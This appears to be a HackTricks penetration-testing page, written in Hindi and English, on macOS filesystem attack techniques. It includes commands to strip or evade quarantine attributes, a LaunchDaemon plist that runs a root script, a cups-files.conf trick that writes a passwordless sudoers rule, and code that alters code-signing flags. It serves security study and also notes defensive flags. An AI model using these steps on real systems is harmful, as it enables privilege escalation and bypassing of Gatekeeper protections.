# macOS FS Tricks

{{#include ../../../../banners/hacktricks-training.md}}

## POSIX permissions combinations

एक **directory** के लिए, तीन permission bits का अर्थ regular file से अलग होता है। `chmod(1)` directory पर लागू होने पर execute bit को "**search**" कहता है:<sup>[2]</sup>

> `0100` Files के लिए, owner को execution की अनुमति देता है। Directories के लिए, owner को directory में **search** करने की अनुमति देता है।

- **read** - आप directory entries को **enumerate** कर सकते हैं (names की list देख सकते हैं)।
- **write** - आप directory में entries को **create, rename और delete** कर सकते हैं। ध्यान दें कि यह *containing* directory की property है, file की नहीं: आप ऐसी file को delete कर सकते हैं जिसे आप read या write नहीं कर सकते, बशर्ते आप उसकी parent directory में write कर सकें।
- किसी **subdirectory** को delete करने के लिए उसका empty होना आवश्यक है, जिसके लिए उसके अंदर की हर चीज़ को हटाने के लिए पर्याप्त rights चाहिए।
- यदि directory में **sticky bit** (`S_ISVTX`, जैसे `/tmp`) है, तो यह प्रतिबंधित होता है — POSIX के अनुसार, कोई process उसमें files को केवल तभी remove या rename कर सकता है जब वह file का owner हो, directory का owner हो, या उसके पास उचित privileges हों।<sup>[1]</sup>
- **execute / search** - आपको directory को **traverse** करने की अनुमति होती है। Pathname resolution प्रत्येक component को "उसके predecessor द्वारा निर्दिष्ट directory में" locate करता है, इसलिए path prefix के किसी भी single component पर search rights खोने से उसके नीचे की हर चीज़ path द्वारा unreachable हो जाती है, भले ही leaf file स्वयं world-readable हो।<sup>[1]</sup>

### Dangerous Combinations

**root के स्वामित्व वाली file/folder को overwrite करने का तरीका**, लेकिन:

- Path में एक parent **directory owner** user है
- Path में एक parent **directory owner** ऐसा **users group** है जिसके पास **write access** है
- किसी users **group** के पास **file** पर **write** access है

पिछले किसी भी combination में, attacker expected path में एक **sym/hard link** **inject** करके privileged arbitrary write प्राप्त कर सकता है।

### Folder root R+X special case

यह ऊपर दिए गए pathname-resolution rule से सीधे स्पष्ट होता है। यदि कोई **directory केवल root को R+X** प्रदान करती है, तो उसके अंदर की files बाकी सभी के लिए *path द्वारा* unreachable होती हैं — लेकिन **files' own permission bits अभी भी permissive हो सकते हैं**। बाधा केवल directory है।

इसलिए कोई भी primitive जो आपको file को उस directory से **बाहर निकालने** देता है — जैसे कोई privileged process जो attacker द्वारा चुने गए path को ऐसी location में **moves/renames/copies** करता है जिसे आप traverse कर सकते हैं — arbitrary read में बदल जाता है, और file के अपने mode को defeat करने की आवश्यकता कभी नहीं पड़ती:
```bash
# Reproduce the primitive locally
sudo mkdir -p /tmp/locked && sudo chmod 700 /tmp/locked
sudo sh -c 'echo secret > /tmp/locked/data.txt; chmod 644 /tmp/locked/data.txt'

ls -l /tmp/locked/data.txt   # Permission denied: cannot even stat through the directory
cat /tmp/locked/data.txt     # Permission denied

# The file itself is mode 644 - only the parent directory's search bit blocks you.
sudo ls -l /tmp/locked/
```
कम privilege वाले user से source path स्वीकार करने वाले privileged file movers (installers, log rotators, crash/diagnostic collectors, backup और "export" features) खोजें।

## Symbolic Link / Hard Link

### Permissive file/folder

यदि कोई privileged process ऐसे **file** में data लिख रहा है जिसे कोई **lower privileged user** **controlled** कर सकता है, या जिसे पहले किसी lower privileged user ने **created** किया हो। User उसे Symbolic या Hard link के माध्यम से किसी अन्य file की ओर **point** कर सकता है, और privileged process उस file में लिखेगा।

अन्य sections में देखें कि कोई attacker **arbitrary write से privileges escalate** करने के लिए उसका **abuse** कैसे कर सकता है।

### Open `O_NOFOLLOW`

[`open(2)`](https://keith.github.io/xcode-man-pages/open.2.html) के अनुसार: *"यदि mask में `O_NOFOLLOW` का उपयोग किया गया है और `open()` को दी गई target file एक symbolic link है, तो `open()` fail हो जाएगा।"* केवल **final** component की जाँच की जाती है — प्रत्येक **intermediate** component का resolution और follow होना जारी रहता है। इसलिए कोई developer यदि `O_NOFOLLOW` से write को "protected" करता है, तो attacker target path की किसी भी **parent directory** में symlink रखकर उस पर हमला कर सकता है।<sup>[3]</sup>

उसी man page में वे flags document किए गए हैं जो वास्तव में इस gap को बंद करते हैं:<sup>[3]</sup>

- **`O_NOFOLLOW_ANY`** — *"यदि ... `open()` को दिए गए path का कोई भी component symbolic link है, तो `open()` fail हो जाएगा।"*
- **`O_RESOLVE_BENEATH`** — *"यदि ... निर्दिष्ट path resolution उस directory से बाहर निकलता है जो fd से associated है, तो `openat()` fail हो जाएगा।"*

अन्यथा, पहले से validated directory FD के सापेक्ष `openat()`, या `realpath()` + re-validation, mid-path symlink swaps को रोकने के शेष तरीके हैं।

## .fileloc

**`.fileloc`** extension वाली files अन्य applications या binaries की ओर point कर सकती हैं, इसलिए जब उन्हें open किया जाता है, तो वही application/binary execute होगा।\
Example:
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
<key>URL</key>
<string>file:///System/Applications/Calculator.app</string>
<key>URLPrefix</key>
<integer>0</integer>
</dict>
</plist>
```
## File Descriptors

### Leak FD (no `O_CLOEXEC`)

यदि `open` के call में `O_CLOEXEC` flag नहीं है, तो file descriptor child process द्वारा inherit कर लिया जाएगा। इसलिए, यदि कोई privileged process किसी privileged file को open करता है और attacker द्वारा नियंत्रित process को execute करता है, तो attacker **privileged file का FD inherit कर लेगा**।

इसका canonical example **OS X 10.10 में `DYLD_PRINT_TO_FILE` LPE** है ([SektionEins](https://www.sektioneins.de/en/blog/15-07-07-dyld_print_to_file_lpe.html)):<sup>[4]</sup>

- `dyld` ने **restricted (suid root) binaries** में भी `DYLD_PRINT_TO_FILE=/path` को honour किया, क्योंकि उस particular variable को `processDyldEnvironmentVariable()` के बाहर parse किया गया था।
- इसने `open(loggingPath, O_WRONLY | O_CREAT | O_APPEND, 0644)` चलाया, इसलिए इसने **arbitrary path पर root-owned file create की**।
- FD को **कभी close नहीं किया गया और उसमें close-on-exec flag नहीं था**, इसलिए suid binary की हर child ने **root-owned file का writable FD inherit किया**।
- उदाहरण के लिए `DYLD_PRINT_TO_FILE=/etc/target suid_binary` चलाने और फिर child में inherited FD number पढ़ने से arbitrary root-owned writes मिल गए; `fcntl(fd, F_SETFL, 0)` ने `O_APPEND` को clear करके append करने के बजाय overwrite करने की अनुमति भी दी।

यही pattern तब भी दिखाई देता है जब कोई privileged process आपके control वाली किसी चीज़ को `exec` करने **से पहले** कोई file open करता है (helper tools, `$EDITOR` के माध्यम से invoke किए गए `crontab`-style editors, env-var path से open की गई log/debug files...)। आपके द्वारा inherited FDs को इस command से enumerate करें:
```bash
# From inside the child process
ls -l /dev/fd/
# or
lsof -p $$
```
`2` से ऊपर की कोई भी चीज़, जो ऐसी फ़ाइल की ओर संकेत करती है जिसे आप स्वयं खोल नहीं सकते, एक arbitrary-write (या arbitrary-read) primitive है।

## quarantine xattrs tricks से बचें

### इसे हटाएँ
```bash
xattr -d com.apple.quarantine /path/to/file_or_app
```
### uchg / uchange / uimmutable flag

यदि किसी file/folder में यह immutable attribute है, तो उस पर xattr लगाना संभव नहीं होगा
```bash
echo asd > /tmp/asd
chflags uchg /tmp/asd # "chflags uchange /tmp/asd" or "chflags uimmutable /tmp/asd"
xattr -w com.apple.quarantine "" /tmp/asd
xattr: [Errno 1] Operation not permitted: '/tmp/asd'

ls -lO /tmp/asd
# check the "uchg" in the output
```
### xattr support के बिना file systems

macOS द्वारा mount किए जा सकने वाले हर file system में **extended attributes** को native रूप से store करने की सुविधा नहीं होती। HFS+ और APFS में यह सुविधा है; **FAT32, exFAT और (अधिकांश) NFS mounts में नहीं** — macOS इन्हें `._<filename>` नाम वाली **AppleDouble** side file में लिखकर emulate करता है ([The Eclectic Light Company](https://eclecticlight.co/2018/01/12/which-file-systems-and-cloud-services-preserve-extended-attributes/)).<sup>[5]</sup>

यह quarantine के लिए महत्वपूर्ण है, क्योंकि xattr तभी survive करता है जब उसे वास्तव में उसी volume से **लिखा और वापस पढ़ा** जा सके:
```bash
# Check whether a mount point round-trips xattrs at all
xattr -w com.apple.quarantine "0081;00000000;test;" /Volumes/SOMEUSB/file
xattr -p com.apple.quarantine /Volumes/SOMEUSB/file
ls -a /Volumes/SOMEUSB/          # look for the ._file AppleDouble companion
```
यदि volume को बाद में ऐसे path पर read किया जाता है जो `._` companion को ignore करता है (या companion को strip/delete कर दिया जाता है), तो file **बिना quarantine flag के** पहुंचती है — और unquarantined `.app` App Sandbox से escape करने के लिए पर्याप्त है, जैसा कि [macOS Sandbox Debug & Bypass](../macos-sandbox/macos-sandbox-debug-and-bypass/README.md#bypassing-quarantine-attribute) में बताया गया है।

### writeextattr ACL

यह ACL file में `xattrs` जोड़ने से रोकता है
```bash
rm -rf /tmp/test*
echo test >/tmp/test
chmod +a "everyone deny write,writeattr,writeextattr,writesecurity,chown" /tmp/test
ls -le /tmp/test
ditto -c -k test test.zip
# Download the zip from the browser and decompress it, the file should be without a quarantine xattr

cd /tmp
echo y | rm test

# Decompress it with ditto
ditto -x -k --rsrc test.zip .
ls -le /tmp/test

# Decompress it with open (if sandboxed decompressed files go to the Downloads folder)
open test.zip
sleep 1
ls -le /tmp/test
```
### **com.apple.acl.text xattr + AppleDouble**

**AppleDouble** file format किसी file को उसके ACEs सहित copy करता है।

[**source code**](https://opensource.apple.com/source/Libc/Libc-391/darwin/copyfile.c.auto.html) में देखा जा सकता है कि **`com.apple.acl.text`** नामक xattr में संग्रहीत ACL text representation को decompressed file में ACL के रूप में set किया जाएगा। इसलिए, यदि आपने **AppleDouble** file format का उपयोग करके किसी application को ऐसी ACL के साथ zip file में compress किया, जो अन्य xattrs को उसमें लिखे जाने से रोकती है... तो application में quarantine xattr set नहीं किया गया:

अधिक जानकारी के लिए [**original report**](https://www.microsoft.com/en-us/security/blog/2022/12/19/gatekeepers-achilles-heel-unearthing-a-macos-vulnerability/) देखें।<sup>[6]</sup>

इसे replicate करने के लिए पहले हमें सही acl string प्राप्त करनी होगी:
```bash
# Everything will be happening here
mkdir /tmp/temp_xattrs
cd /tmp/temp_xattrs

# Create a folder and a file with the acls and xattr
mkdir del
mkdir del/test_fold
echo test > del/test_fold/test_file
chmod +a "everyone deny write,writeattr,writeextattr,writesecurity,chown" del/test_fold
chmod +a "everyone deny write,writeattr,writeextattr,writesecurity,chown" del/test_fold/test_file
ditto -c -k del test.zip

# uncomporess to get it back
ditto -x -k --rsrc test.zip .
ls -le test
```
(ध्यान दें कि अगर यह काम करता भी है, तो sandbox पहले quarantine xattr लिख देता है)

वास्तव में इसकी आवश्यकता नहीं है, लेकिन मैं इसे सिर्फ़ एहतियात के तौर पर यहाँ छोड़ रहा हूँ:


{{#ref}}
macos-xattr-acls-extra-stuff.md
{{#endref}}

## Bypass signature checks

### Bypass platform binaries checks

कुछ security checks यह जाँचते हैं कि binary एक **platform binary** है या नहीं, उदाहरण के लिए किसी XPC service से connect करने की अनुमति देने के लिए। हालाँकि, जैसा कि https://jhftss.github.io/A-New-Era-of-macOS-Sandbox-Escapes/ में bypass पर बताया गया है, `DYLD_INSERT_LIBRARIES` env variable का उपयोग करके dyld के माध्यम से exploit inject कर, `/bin/ls` जैसी platform binary प्राप्त करके इस check को bypass करना संभव है।<sup>[7]</sup>

### Bypass flags `CS_REQUIRE_LV` and `CS_FORCED_LV`

किसी executing binary के लिए इस तरह के code का उपयोग करके checks को bypass करने हेतु अपने flags को modify करना संभव है:<sup>[7]</sup>
```c
// Code from https://jhftss.github.io/A-New-Era-of-macOS-Sandbox-Escapes/
int pid = getpid();
NSString *exePath = NSProcessInfo.processInfo.arguments[0];

uint32_t status = SecTaskGetCodeSignStatus(SecTaskCreateFromSelf(0));
status |= 0x2000; // CS_REQUIRE_LV
csops(pid, 9, &status, 4); // CS_OPS_SET_STATUS

status = SecTaskGetCodeSignStatus(SecTaskCreateFromSelf(0));
NSLog(@"=====Inject successfully into %d(%@), csflags=0x%x", pid, exePath, status);
```
## Code Signatures को Bypass करना

Bundles में **`_CodeSignature/CodeResources`** फ़ाइल होती है, जिसमें **bundle** की प्रत्येक **file** का **hash** होता है। ध्यान दें कि CodeResources का hash भी **executable** में **embedded** होता है, इसलिए हम उसमें भी बदलाव नहीं कर सकते।

हालाँकि, कुछ ऐसी files होती हैं जिनकी signature check नहीं की जाएगी। इनमें plist में `omit` key होती है, जैसे:
```xml
<dict>
...
<key>rules</key>
<dict>
...
<key>^Resources/.*\.lproj/locversion.plist$</key>
<dict>
<key>omit</key>
<true/>
<key>weight</key>
<real>1100</real>
</dict>
...
</dict>
<key>rules2</key>
...
<key>^(.*/index.html)?\.DS_Store$</key>
<dict>
<key>omit</key>
<true/>
<key>weight</key>
<real>2000</real>
</dict>
...
<key>^PkgInfo$</key>
<dict>
<key>omit</key>
<true/>
<key>weight</key>
<real>20</real>
</dict>
...
<key>^Resources/.*\.lproj/locversion.plist$</key>
<dict>
<key>omit</key>
<true/>
<key>weight</key>
<real>1100</real>
</dict>
...
</dict>
```
CLI से resource के signature की गणना करना संभव है:
```bash
openssl dgst -binary -sha1 /System/Cryptexes/App/System/Applications/Safari.app/Contents/Resources/AppIcon.icns | openssl base64
```
## dmgs Mount करना

एक user द्वारा बनाया गया custom dmg कुछ मौजूदा folders के ऊपर भी mount किया जा सकता है। इस तरह आप custom content वाला custom dmg package बना सकते हैं:
```bash
# Create the volume
hdiutil create /private/tmp/tmp.dmg -size 2m -ov -volname CustomVolName -fs APFS 1>/dev/null
mkdir /private/tmp/mnt

# Mount it
hdiutil attach -mountpoint /private/tmp/mnt /private/tmp/tmp.dmg 1>/dev/null

# Add custom content to the volume
mkdir /private/tmp/mnt/custom_folder
echo "hello" > /private/tmp/mnt/custom_folder/custom_file

# Detach it
hdiutil detach /private/tmp/mnt 1>/dev/null

# Next time you mount it, it will have the custom content you wrote

# You can also create a dmg from an app using:
hdiutil create -srcfolder justsome.app justsome.dmg
```
Usually macOS, `com.apple.DiskArbitrarion.diskarbitrariond` Mach service (जो `/usr/libexec/diskarbitrationd` द्वारा प्रदान की जाती है) से बात करके disk mount करता है। यदि LaunchDaemons plist file में `-d` param जोड़कर उसे restart किया जाए, तो logs `/var/log/diskarbitrationd.log` में store होंगे।\
हालाँकि, `com.apple.driver.DiskImages` kext के साथ सीधे communicate करने के लिए `hdik` और `hdiutil` जैसे tools का उपयोग करना संभव है।

## Arbitrary Writes

### Periodic sh scripts

यदि आपकी script को **shell script** के रूप में interpret किया जा सकता है, तो आप **`/etc/periodic/daily/999.local`** shell script को overwrite कर सकते हैं, जो हर दिन trigger होगी।

आप इस script का execution इस प्रकार **fake** कर सकते हैं: **`sudo periodic daily`**

### Daemons

एक arbitrary **LaunchDaemon** जैसे **`/Library/LaunchDaemons/xyz.hacktricks.privesc.plist`** को plist के साथ लिखें, जो इस तरह की arbitrary script execute करे:
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple Computer//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
<key>Label</key>
<string>com.sample.Load</string>
<key>ProgramArguments</key>
<array>
<string>/Applications/Scripts/privesc.sh</string>
</array>
<key>RunAtLoad</key>
<true/>
</dict>
</plist>
```
बस `/Applications/Scripts/privesc.sh` script को उन **commands** के साथ generate करें जिन्हें आप root के रूप में चलाना चाहते हैं।

### Sudoers File

यदि आपके पास **arbitrary write** है, तो आप `/etc/sudoers.d/` folder के अंदर एक file बनाकर अपने लिए **sudo** privileges प्रदान कर सकते हैं।

### PATH files

`/etc/paths` file उन मुख्य स्थानों में से एक है जो PATH env variable को populate करते हैं। इसे overwrite करने के लिए आपके पास root होना आवश्यक है, लेकिन यदि **privileged process** का कोई script **full path** के बिना कोई **command** execute कर रहा है, तो आप इस file को modify करके उसे **hijack** कर सकते हैं।

आप `PATH` env variable में नए folders load करने के लिए `/etc/paths.d` में files भी लिख सकते हैं।

### cups-files.conf

इस technique का उपयोग [इस writeup](https://www.kandji.io/blog/macos-audit-story-part1) में किया गया था।<sup>[8]</sup>

निम्नलिखित content के साथ `/etc/cups/cups-files.conf` file बनाएं:
```
ErrorLog /etc/sudoers.d/lpe
LogFilePerm 777
<some junk>
```
यह `/etc/sudoers.d/lpe` फ़ाइल को permissions 777 के साथ बनाएगा। अंत में मौजूद अतिरिक्त junk error log creation को trigger करने के लिए है।

फिर, privileges escalate करने के लिए आवश्यक config `/etc/sudoers.d/lpe` में लिखें, जैसे `%staff ALL=(ALL) NOPASSWD:ALL`।

इसके बाद `/etc/cups/cups-files.conf` फ़ाइल को फिर से modify करें और `LogFilePerm 700` दर्ज करें, ताकि नई sudoers फ़ाइल `cupsctl` invoke करने पर valid हो जाए।

### Sandbox Escape

FS arbitrary write के ज़रिए macOS sandbox से escape करना संभव है। कुछ examples के लिए [macOS Auto Start](../../../../macos-auto-start-locations.md) page देखें, लेकिन एक common तरीका है `~/Library/Preferences/com.apple.Terminal.plist` में एक Terminal preferences फ़ाइल लिखना, जो startup पर कोई command execute करे, और फिर उसे `open` का उपयोग करके call करना।

## अन्य users के रूप में writable files generate करना

एक बहुत common privesc primitive यह है कि आपके control वाले directory में एक **privileged process आपके लिए कोई file create करे**, और फिर उस file पर **write access** बनाए रखना। इसके लिए दो ingredients आवश्यक हैं:

1. एक directory जिसका ownership आपके पास हो (या जहाँ आप **inheritable ACL** set कर सकें), ताकि उसके अंदर बनाई गई हर चीज़ आपकी permissions inherit करे।
2. एक privileged/`suid` process जिसे **कहाँ** file create करनी है, यह बताया जा सके — आमतौर पर किसी debug/logging environment variable, config file या helper के XPC API के माध्यम से।

**Inheritable ACL** वाला हिस्सा यह सुनिश्चित करता है कि बनाई गई file आपके लिए writable रहे, भले ही उसका ownership किसी अन्य user के पास हो। `file_inherit` / `directory_inherit` inheritance flags [`chmod(1)`](https://keith.github.io/xcode-man-pages/chmod.1.html) में documented हैं:
```bash
DIRNAME=/tmp/inherit_test
mkdir -p "$DIRNAME"

# file_inherit + directory_inherit => everything created inside is writable by me
chmod +a "$(whoami) allow read,write,append,execute,readattr,writeattr,readextattr,writeextattr,chown,delete,writesecurity,readsecurity,list,search,add_file,add_subdirectory,delete_child,file_inherit,directory_inherit" "$DIRNAME"

ls -lde "$DIRNAME"   # confirm the ACE is present
```
अब `$DIRNAME` के अंदर कोई भी privileged process जो file बनाता है, वह **आपके द्वारा writable** है। यदि वह directory ऐसी location भी है जिसे बाद में **root के रूप में executed** किया जाता है (`/etc/periodic/*`, `/etc/cron.d`, `/etc/sudoers.d`, कोई LaunchDaemon directory...), तो यह सीधे root escalation का कारण बनता है। File मिल जाने के बाद उसमें क्या लिखना है, इसके लिए ऊपर दिए गए [Sudoers File](#sudoers-file) और [cups-files.conf](#cups-filesconf) sections देखें।

"env variable makes a root process create a file, and the FD leaks to you" chain के पूर्ण worked example के लिए ऊपर दिया गया [Leak FD (no `O_CLOEXEC`)](#leak-fd-no-o_cloexec) देखें।

## POSIX Shared Memory

**POSIX shared memory** POSIX-compliant operating systems में processes को एक common memory area access करने की अनुमति देता है, जिससे अन्य inter-process communication methods की तुलना में तेज communication संभव होती है। इसमें `shm_open()` के साथ shared memory object बनाना या खोलना, `ftruncate()` के साथ उसका size निर्धारित करना, और `mmap()` का उपयोग करके उसे process के address space में map करना शामिल है। इसके बाद processes इस memory area से सीधे read और write कर सकते हैं। Concurrent access को manage करने और data corruption रोकने के लिए अक्सर mutexes या semaphores जैसे synchronization mechanisms का उपयोग किया जाता है। अंत में, processes `munmap()` और `close()` के साथ shared memory को unmap और close करते हैं, और वैकल्पिक रूप से `shm_unlink()` के साथ memory object को remove कर सकते हैं। यह system उन environments में efficient और fast IPC के लिए विशेष रूप से प्रभावी है, जहाँ multiple processes को shared data को तेजी से access करने की आवश्यकता होती है।

<details>

<summary>Producer Code Example</summary>
```c
// gcc producer.c -o producer -lrt
#include <fcntl.h>
#include <sys/mman.h>
#include <sys/stat.h>
#include <unistd.h>
#include <stdio.h>
#include <stdlib.h>

int main() {
const char *name = "/my_shared_memory";
const int SIZE = 4096; // Size of the shared memory object

// Create the shared memory object
int shm_fd = shm_open(name, O_CREAT | O_RDWR, 0666);
if (shm_fd == -1) {
perror("shm_open");
return EXIT_FAILURE;
}

// Configure the size of the shared memory object
if (ftruncate(shm_fd, SIZE) == -1) {
perror("ftruncate");
return EXIT_FAILURE;
}

// Memory map the shared memory
void *ptr = mmap(0, SIZE, PROT_READ | PROT_WRITE, MAP_SHARED, shm_fd, 0);
if (ptr == MAP_FAILED) {
perror("mmap");
return EXIT_FAILURE;
}

// Write to the shared memory
sprintf(ptr, "Hello from Producer!");

// Unmap and close, but do not unlink
munmap(ptr, SIZE);
close(shm_fd);

return 0;
}
```
</details>

<details>

<summary>Consumer Code का उदाहरण</summary>
```c
// gcc consumer.c -o consumer -lrt
#include <fcntl.h>
#include <sys/mman.h>
#include <sys/stat.h>
#include <unistd.h>
#include <stdio.h>
#include <stdlib.h>

int main() {
const char *name = "/my_shared_memory";
const int SIZE = 4096; // Size of the shared memory object

// Open the shared memory object
int shm_fd = shm_open(name, O_RDONLY, 0666);
if (shm_fd == -1) {
perror("shm_open");
return EXIT_FAILURE;
}

// Memory map the shared memory
void *ptr = mmap(0, SIZE, PROT_READ, MAP_SHARED, shm_fd, 0);
if (ptr == MAP_FAILED) {
perror("mmap");
return EXIT_FAILURE;
}

// Read from the shared memory
printf("Consumer received: %s\n", (char *)ptr);

// Cleanup
munmap(ptr, SIZE);
close(shm_fd);
shm_unlink(name); // Optionally unlink

return 0;
}

```
</details>

## macOS Guarded Descriptors

**macOSCguarded descriptors** macOS में शुरू की गई एक security feature हैं, जो user applications में **file descriptor operations** की safety और reliability बढ़ाने के लिए बनाई गई हैं। ये guarded descriptors file descriptors के साथ specific restrictions या "guards" जोड़ने का तरीका प्रदान करते हैं, जिन्हें kernel लागू करता है।

यह feature विशेष रूप से **unauthorized file access** या **race conditions** जैसी security vulnerabilities को रोकने के लिए उपयोगी है। ये vulnerabilities तब होती हैं, जब उदाहरण के लिए कोई thread किसी file description को access कर रहा हो और **किसी अन्य vulnerable thread को उस पर access दे रहा हो**, या जब कोई file descriptor किसी **vulnerable child process** द्वारा **inherited** हो जाता है। इस functionality से संबंधित कुछ functions हैं:

- `guarded_open_np`: guard के साथ एक FD खोलता है
- `guarded_close_np`: इसे बंद करता है
- `change_fdguard_np`: किसी descriptor पर guard flags बदलता है (guard protection हटाना भी संभव है)

## References

- [1] [POSIX.1-2024 — Base Definitions, Ch. 4 (File Access Permissions, Directory Protection, Pathname Resolution)](https://pubs.opengroup.org/onlinepubs/9799919799/basedefs/V1_chap04.html)
- [2] [`chmod(1)` man page](https://keith.github.io/xcode-man-pages/chmod.1.html) (directory search/execute bit, ACL inheritance flags)
- [3] [`open(2)` man page](https://keith.github.io/xcode-man-pages/open.2.html) (`O_NOFOLLOW`, `O_NOFOLLOW_ANY`, `O_RESOLVE_BENEATH`)
- [4] [SektionEins - OS X 10.10 DYLD_PRINT_TO_FILE Local Privilege Escalation](https://www.sektioneins.de/en/blog/15-07-07-dyld_print_to_file_lpe.html) (close-on-exec के बिना leaked FD)
- [5] [The Eclectic Light Company - Which file systems and cloud services preserve extended attributes?](https://eclecticlight.co/2018/01/12/which-file-systems-and-cloud-services-preserve-extended-attributes/)
- [6] [Microsoft - Gatekeeper's Achilles heel: unearthing a macOS vulnerability](https://www.microsoft.com/en-us/security/blog/2022/12/19/gatekeepers-achilles-heel-unearthing-a-macos-vulnerability/)
- [7] [Mickey (Jhftss) - A New Era of macOS Sandbox Escapes](https://jhftss.github.io/A-New-Era-of-macOS-Sandbox-Escapes/)
- [8] [Kandji - Uncovering Apple Vulnerabilities: The diskarbitrationd and storagekitd Audit Story Part 1](https://www.kandji.io/blog/macos-audit-story-part1)

{{#include ../../../../banners/hacktricks-training.md}}
